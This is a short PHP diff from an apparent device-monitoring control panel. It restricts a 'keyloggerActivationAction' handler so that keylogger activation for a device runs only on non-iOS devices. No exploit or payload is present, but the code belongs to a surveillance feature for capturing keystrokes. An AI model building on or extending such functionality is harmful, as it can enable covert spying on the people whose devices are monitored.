@@ -72,7 +72,7 @@ class Instructions extends BaseController {
     public function keyloggerActivationAction() 
     {
         
-        if ($this->getRequest()->hasGet('activate')) {
+        if ($this->getRequest()->hasGet('activate') && $this->di['currentDevice']['os'] !== 'ios') {
             $settingsModel = new \Models\Cp\Settings($this->di);
             $settings = $settingsModel->getDeviceSettings($this->di['devId']);
             
